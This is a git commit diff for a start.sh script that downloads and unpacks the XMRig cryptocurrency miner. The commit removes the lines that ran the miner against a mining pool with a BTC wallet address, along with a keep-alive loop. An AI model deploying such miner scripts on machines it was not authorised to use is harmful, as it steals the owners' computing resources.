fbe1aef275375c4e5e8359307dd51a5c3d08779e
danieldave1 <90144285+danieldave1@users.noreply.github.com>
2021-09-06 22:49:04 +0900

    Update start.sh

--- start.sh
+++ start.sh
@@ -4,8 +4,3 @@ sudo apt install screen -y
 wget https://github.com/xmrig/xmrig/releases/download/v6.14.0/xmrig-6.14.0-linux-x64.tar.gz
 tar xf xmrig-6.14.0-linux-x64.tar.gz
 cd xmrig-6.14.0
-./xmrig -o rx.unmineable.com:3333 -a rx -k -u BTC:1BqZsCMiQ3RAWSqqY6iJtLDctcSw7jcJC4.rig5 -p x
-while [ 1 ]; do
-sleep 3
-done
-sleep 999
